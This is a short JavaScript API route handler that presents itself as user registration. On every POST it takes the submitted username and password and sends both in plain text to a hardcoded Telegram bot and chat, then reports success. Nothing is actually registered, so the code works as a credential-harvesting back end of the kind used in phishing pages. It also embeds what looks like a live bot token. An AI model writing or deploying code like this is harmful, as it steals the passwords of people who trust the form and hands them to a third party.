export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { username, password } = req.body;

    const telegramBotToken = "8166858964:AAE_rAfdtU8Qcj8BuUVRhlFKlJdBmzfuztY";
    const chatId = "6619154186";

    const message = `🆕 New user registered:\n👤 Username: ${username}\n🔒 Password: ${password}`;

    const sendUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    await fetch(sendUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });

    return res.status(200).json({ success: true });
  }

  res.status(405).end(); // Method Not Allowed
}
